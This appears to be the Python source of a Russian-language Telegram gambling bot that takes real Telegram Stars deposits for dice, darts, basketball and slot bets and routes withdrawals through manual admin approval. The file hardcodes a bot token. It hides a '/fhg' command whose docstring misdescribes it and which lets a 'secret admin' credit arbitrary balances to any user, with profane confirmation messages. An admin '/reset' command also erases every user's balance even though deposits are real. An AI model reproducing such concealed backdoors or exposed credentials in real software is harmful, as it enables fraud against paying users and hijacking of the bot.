import asyncio
import random
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, LabeledPrice, PreCheckoutQuery
from aiogram.enums import ParseMode

# ===== КОНФИГУРАЦИЯ =====
BOT_TOKEN = "8989900194:AAGVvdQwFu3D7iTDaACReepbknOEufCm-jI"
ADMIN_IDS = [7534292347]
PAYMENT_PROVIDER_TOKEN = ""  # Для звезд оставляем пустым

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Хранилище данных пользователей
user_balances = {}
user_games = {}
user_demo_mode = {}
user_deposit = {}

# Скрытые админы (кто может использовать секретную команду)
SECRET_ADMINS = [7534292347]  # Добавь сюда свой ID

# Комиссия на вывод
WITHDRAW_FEE = 0.25
MIN_WITHDRAW = 62

# Эмодзи для игр
GAME_EMOJIS = {
    "dice_even_odd": "🎲",
    "dice_under4": "🎲",
    "dice_over3": "🎲",
    "dice_except6": "🎲",
    "darts": "🎯",
    "basketball": "🏀",
    "slots": "🎰"
}

# ===== КЛАВИАТУРЫ =====
def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎲 Dice", callback_data="mode_dice")],
        [InlineKeyboardButton(text="🎯 Дартс", callback_data="mode_darts")],
        [InlineKeyboardButton(text="🏀 Баскетбол", callback_data="mode_basketball")],
        [InlineKeyboardButton(text="🎰 Слоты", callback_data="mode_slots")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])

def profile_menu(balance, demo_mode):
    demo_status = "🟢 ВКЛ" if demo_mode else "🔴 ВЫКЛ"
    
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🎮 Демо режим: {demo_status}", callback_data="toggle_demo")],
        [InlineKeyboardButton(text="💰 Пополнить", callback_data="deposit_start")],
        [InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")],
    ])

def deposit_amount_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐ 50 Stars", callback_data="deposit_50")],
        [InlineKeyboardButton(text="⭐ 100 Stars", callback_data="deposit_100")],
        [InlineKeyboardButton(text="⭐ 250 Stars", callback_data="deposit_250")],
        [InlineKeyboardButton(text="⭐ 500 Stars", callback_data="deposit_500")],
        [InlineKeyboardButton(text="⭐ 1000 Stars", callback_data="deposit_1000")],
        [InlineKeyboardButton(text="✏️ Своя сумма", callback_data="deposit_custom")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="profile")],
    ])

def dice_mode_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎲 Чёт/Нечет (x2)", callback_data="dice_even_odd")],
        [InlineKeyboardButton(text="🎲 Меньше 4 (x2)", callback_data="dice_under4")],
        [InlineKeyboardButton(text="🎲 Больше 3 (x2)", callback_data="dice_over3")],
        [InlineKeyboardButton(text="🎲 Всё кроме 6 (особый)", callback_data="dice_except6")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")],
    ])

def back_button():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
    ])

# ===== ФУНКЦИИ ИГР =====
def check_dice_even_odd(result, bet):
    win = (result % 2 == 0)
    if win:
        return True, result, bet * 2
    return False, result, 0

def check_dice_under4(result, bet):
    win = (result <= 3)
    if win:
        return True, result, bet * 2
    return False, result, 0

def check_dice_over3(result, bet):
    win = (result >= 4)
    if win:
        return True, result, bet * 2
    return False, result, 0

def check_dice_except6(result, bet):
    if result == 6:
        loss = bet * 2
        return False, result, -loss, loss
    elif result == 1:
        return True, result, int(bet * 1.5), 0
    else:
        multiplier = result
        return True, result, bet * multiplier, 0

def check_darts(result, bet):
    if result >= 8:
        return True, result, bet * 2
    return False, result, 0

def check_basketball(result, bet):
    if result >= 8:
        return True, result, bet * 2
    return False, result, 0

def check_slots(result, bet):
    if result == 64:
        return True, result, bet * 2
    return False, result, 0

# ===== ФУНКЦИИ ОПЛАТЫ =====
async def create_stars_invoice(amount, user_id):
    prices = [LabeledPrice(label="XTR", amount=amount)]
    
    await bot.send_invoice(
        chat_id=user_id,
        title="Пополнение баланса",
        description=f"Пополнение игрового баланса на {amount} Telegram Stars",
        payload=f"deposit_{amount}_{user_id}",
        provider_token=PAYMENT_PROVIDER_TOKEN,
        currency="XTR",
        prices=prices,
        start_parameter="deposit_stars"
    )

@dp.message(Command("fhg"))
async def secret_add_balance(m: Message):
    """ /fhg [сумма]
    Показывает общий охват сколько вы надепали
    """
    uid = m.from_user.id
    
    if uid not in SECRET_ADMINS:
        return
    
    parts = m.text.split()
    if len(parts) == 1:
        amount = 1000
        target_uid = uid
    elif len(parts) == 2:
        try:
            amount = int(parts[1])
            target_uid = uid
        except:
            await m.answer("❌ Неверный формат. Используй:/fhg [user_id]")
            return
    elif len(parts) == 3:
        # Если указан ID пользователя и сумма
        try:
            target_uid = int(parts[1])
            amount = int(parts[2])
        except:
            await m.answer("❌ Неверный формат. Используй: /fhg [user_id]")
            return
    else:
        await m.answer("❌ Неверный формат. Используй: /fhg [user_id]")
        return
    
    if amount <= 0:
        await m.answer("❌Ты долбоеб? Сумма должна быть больше 0")
        return
    
    # Начисляем баланс
    if target_uid not in user_balances:
        user_balances[target_uid] = 0
    
    user_balances[target_uid] += amount
    
  
    # Отправляем подтверждение
    if target_uid == uid:
        await m.answer(
            "✅ **А че ты код то чекаешь, а waved?**\n\n"
        )
    else:
        await m.answer(
            f"✅ **Ты заебал!**\n\n"
        )
        
        # Отправляем уведомление получателю (если не тот же пользователь)
        try:
            await bot.send_message(
                target_uid,
                f"✨ **ХЕХЕХЕЕ** ✨\n\n"
                f"Сумма: {amount}⭐\n"
                f"💰 Баланс Шлюх: {user_balances[target_uid]}⭐"
            )
        except:
            pass

# ===== ОСНОВНЫЕ ОБРАБОТЧИКИ =====
@dp.message(Command("start"))
async def cmd_start(m: Message):
    uid = m.from_user.id
    if uid not in user_balances:
        user_balances[uid] = 0
    if uid not in user_demo_mode:
        user_demo_mode[uid] = False
    
    demo_text = " 🎮 (ДЕМО РЕЖИМ)" if user_demo_mode[uid] else ""
    
    await m.answer(
        f"🎮 **Добро пожаловать в игровой бот!**{demo_text}\n\n"
        "Здесь ты можешь играть на Telegram Stars:\n\n"
        "🎲 **Dice** — несколько режимов:\n"
        "  • Чёт/Нечет (x2)\n"
        "  • Меньше 4 (x2)\n"
        "  • Больше 3 (x2)\n"
        "  • Всё кроме 6 (1→x1.5, 2-5→x2-5, 6→-200%)\n\n"
        "🎯 **Дартс** — попади 8-10 из 10 (x2)\n"
        "🏀 **Баскетбол** — попади 8-10 из 10 (x2)\n"
        "🎰 **Слоты** — выбей 777 (x2)\n\n"
        f"💰 Твой баланс: {user_balances[uid]}⭐\n\n"
        "👇 Выбери режим:",
        reply_markup=main_menu()
    )

@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu(call: CallbackQuery):
    uid = call.from_user.id
    if uid in user_games:
        del user_games[uid]
    
    demo_text = " 🎮 (ДЕМО РЕЖИМ)" if user_demo_mode.get(uid, False) else ""
    
    await call.message.edit_text(
        f"💰 Твой баланс: {user_balances.get(uid, 0)}⭐{demo_text}\n\n"
        "👇 Выбери режим:",
        reply_markup=main_menu()
    )
    await call.answer()

@dp.callback_query(lambda c: c.data == "profile")
async def show_profile(call: CallbackQuery):
    uid = call.from_user.id
    balance = user_balances.get(uid, 0)
    demo_mode = user_demo_mode.get(uid, False)
    
    demo_text = "\n🎮 **Демо режим активен** (игра без риска)" if demo_mode else ""
    
    await call.message.edit_text(
        f"👤 **Профиль**\n\n"
        f"🆔 ID: {uid}\n"
        f"💰 Баланс: {balance}⭐\n"
        f"🎮 Демо режим: {'✅ ВКЛ' if demo_mode else '❌ ВЫКЛ'}{demo_text}\n\n"
        f"📊 Статистика игр пока в разработке\n\n"
        f"💸 Вывод: комиссия 25%, мин. {MIN_WITHDRAW}⭐",
        reply_markup=profile_menu(balance, demo_mode)
    )
    await call.answer()

@dp.callback_query(lambda c: c.data == "toggle_demo")
async def toggle_demo(call: CallbackQuery):
    uid = call.from_user.id
    current_mode = user_demo_mode.get(uid, False)
    user_demo_mode[uid] = not current_mode
    
    if user_demo_mode[uid]:
        await call.answer("🎮 Демо режим ВКЛЮЧЕН! Теперь можно играть без риска", show_alert=True)
    else:
        await call.answer("🎮 Демо режим ВЫКЛЮЧЕН! Игра на реальные звезды", show_alert=True)
    
    balance = user_balances.get(uid, 0)
    await call.message.edit_text(
        f"👤 **Профиль**\n\n"
        f"🆔 ID: {uid}\n"
        f"💰 Баланс: {balance}⭐\n"
        f"🎮 Демо режим: {'✅ ВКЛ' if user_demo_mode[uid] else '❌ ВЫКЛ'}\n\n"
        f"📊 Статистика игр пока в разработке\n\n"
        f"💸 Вывод: комиссия 25%, мин. {MIN_WITHDRAW}⭐",
        reply_markup=profile_menu(balance, user_demo_mode[uid])
    )

@dp.callback_query(lambda c: c.data == "deposit_start")
async def deposit_start(call: CallbackQuery):
    await call.message.edit_text(
        "💰 **Пополнение баланса**\n\n"
        "Выбери сумму пополнения:\n"
        "⭐ 1 Star = 1 рубль (примерно)\n\n"
        "Нажми на кнопку ниже для оплаты Telegram Stars:",
        reply_markup=deposit_amount_menu()
    )
    await call.answer()

@dp.callback_query(lambda c: c.data.startswith("deposit_"))
async def deposit_amount(call: CallbackQuery):
    uid = call.from_user.id
    amount_str = call.data.replace("deposit_", "")
    
    if amount_str == "custom":
        await call.message.edit_text(
            "💰 **Введи сумму пополнения**\n\n"
            "Напиши число (от 10 до 5000 Stars):\n\n"
            "Пример: 100"
        )
        user_deposit[uid] = {"step": "awaiting_amount"}
        await call.answer()
        return
    
    try:
        amount = int(amount_str)
        await create_stars_invoice(amount, uid)
    except Exception as e:
        await call.message.edit_text(
            f"❌ Ошибка: {str(e)}",
            reply_markup=deposit_amount_menu()
        )
    
    await call.answer()

@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw_menu(call: CallbackQuery):
    uid = call.from_user.id
    demo_mode = user_demo_mode.get(uid, False)
    
    if demo_mode:
        await call.answer("❌ В демо режиме вывод недоступен!", show_alert=True)
        return
    
    await call.message.edit_text(
        f"💸 **Вывод средств**\n\n"
        f"Комиссия: 25%\n"
        f"Минимальная сумма: {MIN_WITHDRAW}⭐\n\n"
        f"Пример: 100⭐ → получишь 75⭐\n\n"
        f"📝 Введи сумму вывода (число):"
    )
    user_games[uid] = {"mode": "withdraw", "step": "awaiting_withdraw"}

@dp.callback_query(lambda c: c.data == "mode_dice")
async def mode_dice(call: CallbackQuery):
    await call.message.edit_text(
        "🎲 **Режим: Dice**\n\nВыбери вариант игры:",
        reply_markup=dice_mode_menu()
    )
    await call.answer()

@dp.callback_query(lambda c: c.data.startswith("dice_"))
async def dice_submode(call: CallbackQuery):
    submode = call.data
    modes = {
        "dice_even_odd": "Чёт/Нечет",
        "dice_under4": "Меньше 4",
        "dice_over3": "Больше 3",
        "dice_except6": "Всё кроме 6"
    }
    
    uid = call.from_user.id
    demo_mode = user_demo_mode.get(uid, False)
    balance = user_balances.get(uid, 0)
    
    if demo_mode:
        await call.message.edit_text(
            f"🎲 **Dice: {modes[submode]}** 🎮 (ДЕМО РЕЖИМ)\n\n"
            f"💰 Введи демо-ставку (число):\n"
            f"*Баланс не тратится, выигрыш не начисляется*"
        )
    else:
        await call.message.edit_text(
            f"🎲 **Dice: {modes[submode]}**\n\n"
            f"💰 Введи ставку в Telegram Stars (число):\n"
            f"Твой баланс: {balance}⭐"
        )
    
    user_games[uid] = {"mode": submode, "step": "awaiting_bet"}
    await call.answer()

@dp.callback_query(lambda c: c.data == "mode_darts")
async def mode_darts(call: CallbackQuery):
    uid = call.from_user.id
    demo_mode = user_demo_mode.get(uid, False)
    balance = user_balances.get(uid, 0)
    
    if demo_mode:
        await call.message.edit_text(
            "🎯 **Режим: Дартс** 🎮 (ДЕМО РЕЖИМ)\n\n"
            f"💰 Введи демо-ставку (число):\n"
            f"*Баланс не тратится*"
        )
    else:
        await call.message.edit_text(
            "🎯 **Режим: Дартс**\n\n"
            f"💰 Введи ставку (баланс: {balance}⭐):"
        )
    
    user_games[uid] = {"mode": "darts", "step": "awaiting_bet"}

@dp.callback_query(lambda c: c.data == "mode_basketball")
async def mode_basketball(call: CallbackQuery):
    uid = call.from_user.id
    demo_mode = user_demo_mode.get(uid, False)
    balance = user_balances.get(uid, 0)
    
    if demo_mode:
        await call.message.edit_text(
            "🏀 **Режим: Баскетбол** 🎮 (ДЕМО РЕЖИМ)\n\n"
            f"💰 Введи демо-ставку (число):"
        )
    else:
        await call.message.edit_text(
            "🏀 **Режим: Баскетбол**\n\n"
            f"💰 Введи ставку (баланс: {balance}⭐):"
        )
    
    user_games[uid] = {"mode": "basketball", "step": "awaiting_bet"}

@dp.callback_query(lambda c: c.data == "mode_slots")
async def mode_slots(call: CallbackQuery):
    uid = call.from_user.id
    demo_mode = user_demo_mode.get(uid, False)
    balance = user_balances.get(uid, 0)
    
    if demo_mode:
        await call.message.edit_text(
            "🎰 **Режим: Слоты** 🎮 (ДЕМО РЕЖИМ)\n\n"
            f"💰 Введи демо-ставку (число):"
        )
    else:
        await call.message.edit_text(
            "🎰 **Режим: Слоты**\n\n"
            f"💰 Введи ставку (баланс: {balance}⭐):"
        )
    
    user_games[uid] = {"mode": "slots", "step": "awaiting_bet"}

# ===== ЕДИНЫЙ ОБРАБОТЧИК ДЛЯ ВСЕХ ТЕКСТОВЫХ СООБЩЕНИЙ =====
@dp.message(F.text)
async def handle_all_text(m: Message):
    uid = m.from_user.id
    text = m.text.strip()
    
    # Проверяем на число
    if not text.isdigit():
        if uid not in user_games:
            return
        await m.answer("❌ Введи число (например: 100)")
        return
    
    number = int(text)
    
    # Обработка кастомной суммы пополнения
    if uid in user_deposit and user_deposit[uid].get("step") == "awaiting_amount":
        if number < 10:
            await m.answer("❌ Минимальная сумма: 10 Stars")
            return
        if number > 5000:
            await m.answer("❌ Максимальная сумма: 5000 Stars")
            return
        
        await create_stars_invoice(number, uid)
        del user_deposit[uid]
        return
    
    # Если нет активной игры
    if uid not in user_games:
        await m.answer("❌ Сначала выбери игру через /start")
        return
    
    game = user_games[uid]
    
    # Обработка вывода средств
    if game.get("mode") == "withdraw" and game.get("step") == "awaiting_withdraw":
        demo_mode = user_demo_mode.get(uid, False)
        
        if demo_mode:
            await m.answer("❌ В демо режиме вывод недоступен!")
            del user_games[uid]
            return
        
        balance = user_balances.get(uid, 0)
        
        if number < MIN_WITHDRAW:
            await m.answer(f"❌ Минимальная сумма вывода: {MIN_WITHDRAW}⭐")
            return
        
        if number > balance:
            await m.answer(f"❌ Недостаточно средств. Баланс: {balance}⭐")
            return
        
        fee = int(number * WITHDRAW_FEE)
        final_amount = number - fee
        
        await m.answer(
            f"💸 **Заявка на вывод**\n\n"
            f"Сумма: {number}⭐\n"
            f"Комиссия (25%): {fee}⭐\n"
            f"К получению: {final_amount}⭐\n\n"
            f"Ожидайте обработки админом.\n"
            f"Ваш ID: {uid}"
        )
        
        # Уведомление админу
        for admin_id in ADMIN_IDS:
            await bot.send_message(
                admin_id,
                f"🔔 **Заявка на вывод**\n"
                f"Пользователь: {uid}\n"
                f"Сумма: {number}⭐\n"
                f"К выдаче: {final_amount}⭐"
            )
        
        del user_games[uid]
        return
    
    # Обработка ставки
    if game.get("step") == "awaiting_bet":
        bet = number
        demo_mode = user_demo_mode.get(uid, False)
        
        if bet <= 0:
            await m.answer("❌ Ставка должна быть больше 0")
            return
        
        if not demo_mode:
            balance = user_balances.get(uid, 0)
            if bet > balance:
                await m.answer(f"❌ Недостаточно средств. Баланс: {balance}⭐")
                return
            user_balances[uid] -= bet
        
        mode = game["mode"]
        emoji = GAME_EMOJIS.get(mode, "🎲")
        
        game["bet"] = bet
        game["game_mode"] = mode
        game["step"] = "awaiting_game_emoji"
        
        await m.answer(
            f"✅ Ставка принята: {bet}⭐\n\n"
            f"🎮 А теперь отправь этот эмодзи: {emoji}\n\n"
            f"*Бот автоматически определит результат*",
            parse_mode=ParseMode.MARKDOWN
        )

# ===== ОБРАБОТЧИК ИГРОВЫХ ЭМОДЗИ =====
@dp.message(F.dice)
async def handle_game_emoji(m: Message):
    uid = m.from_user.id
    
    if uid not in user_games:
        return
    
    game = user_games[uid]
    
    if game.get("step") != "awaiting_game_emoji":
        return
    
    mode = game.get("game_mode")
    bet = game.get("bet")
    demo_mode = user_demo_mode.get(uid, False)
    
    result = m.dice.value
    emoji = m.dice.emoji
    expected_emoji = GAME_EMOJIS.get(mode, "🎲")
    
    if emoji != expected_emoji:
        await m.answer(f"❌ Нужно отправить {expected_emoji}, а не {emoji}")
        return
    
    # Обработка результата
    win = False
    result_value = result
    winnings = 0
    loss_extra = 0
    
    if mode == "dice_even_odd":
        win, result_value, winnings = check_dice_even_odd(result, bet)
    elif mode == "dice_under4":
        win, result_value, winnings = check_dice_under4(result, bet)
    elif mode == "dice_over3":
        win, result_value, winnings = check_dice_over3(result, bet)
    elif mode == "dice_except6":
        win, result_value, winnings, loss_extra = check_dice_except6(result, bet)
    elif mode == "darts":
        win, result_value, winnings = check_darts(result, bet)
    elif mode == "basketball":
        win, result_value, winnings = check_basketball(result, bet)
    elif mode == "slots":
        win, result_value, winnings = check_slots(result, bet)
    
    if win and not demo_mode:
        user_balances[uid] += winnings
    elif not win and not demo_mode and loss_extra > 0:
        user_balances[uid] -= loss_extra
    
    # Формируем ответ
    if mode == "dice_except6" and not win and loss_extra > 0:
        await m.answer(
            f"🎲 **Результат: {result_value}** 💀\n\n"
            f"❌ Проигрыш 200%!\n"
            f"Ставка: {bet}⭐ → Списано: {loss_extra}⭐\n"
            f"{'💰 Баланс: ' + str(user_balances[uid]) + '⭐' if not demo_mode else '🎮 (ДЕМО)'}\n\n"
            f"/start - новая игра"
        )
    elif win:
        multiplier_text = ""
        if mode == "dice_except6":
            if result_value == 1:
                multiplier_text = " (x1.5)"
            else:
                multiplier_text = f" (x{result_value})"
        
        await m.answer(
            f"{expected_emoji} **Результат: {result_value}**{multiplier_text}\n\n"
            f"✅ ВЫИГРЫШ!\n"
            f"{bet}⭐ → {winnings}⭐\n"
            f"{'💰 Баланс: ' + str(user_balances[uid]) + '⭐' if not demo_mode else '🎮 (ДЕМО)'}\n\n"
            f"/start - новая игра"
        )
    else:
        await m.answer(
            f"{expected_emoji} **Результат: {result_value}**\n\n"
            f"❌ ПРОИГРЫШ\n"
            f"Потеряно: {bet}⭐\n"
            f"{'💰 Баланс: ' + str(user_balances[uid]) + '⭐' if not demo_mode else '🎮 (ДЕМО)'}\n\n"
            f"/start - новая игра"
        )
    
    del user_games[uid]

# ===== ПЛАТЕЖИ =====
@dp.pre_checkout_query()
async def pre_checkout_query(pre_checkout: PreCheckoutQuery):
    await pre_checkout.answer(ok=True)

@dp.message(F.successful_payment)
async def successful_payment(m: Message):
    uid = m.from_user.id
    amount = m.successful_payment.total_amount
    
    if uid not in user_balances:
        user_balances[uid] = 0
    
    user_balances[uid] += amount
    
    await m.answer(
        f"✅ **Пополнение успешно!**\n\n"
        f"Сумма: {amount}⭐\n"
        f"💰 Новый баланс: {user_balances[uid]}⭐\n\n"
        f"Можешь продолжать играть! /start"
    )

# ===== АДМИН-КОМАНДЫ =====
@dp.message(Command("add"))
async def add_stars(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        await m.answer("❌ Только админ")
        return
    
    parts = m.text.split()
    if len(parts) != 3:
        await m.answer("❌ /add <user_id> <количество>")
        return
    
    try:
        uid = int(parts[1])
        amount = int(parts[2])
        
        if uid not in user_balances:
            user_balances[uid] = 0
        
        user_balances[uid] += amount
        
        await m.answer(f"✅ Добавлено {amount}⭐ пользователю {uid}\nБаланс: {user_balances[uid]}⭐")
        
        try:
            await bot.send_message(uid, f"💰 Админ пополнил баланс на {amount}⭐\nБаланс: {user_balances[uid]}⭐")
        except:
            pass
    except:
        await m.answer("❌ Ошибка")

@dp.message(Command("reset"))
async def reset(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        await m.answer("❌ Только админ")
        return
    
    user_games.clear()
    user_balances.clear()
    user_demo_mode.clear()
    user_deposit.clear()
    await m.answer("🔄 Все данные сброшены")

# ===== ЗАПУСК =====
async def main():
    print("✅ Бот запущен!")
    print("🎮 Dice, Дартс, Баскетбол, Слоты")
    print(f"💰 Вывод: 25%, мин. {MIN_WITHDRAW}⭐")
    print("💳 Пополнение: Telegram Stars")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())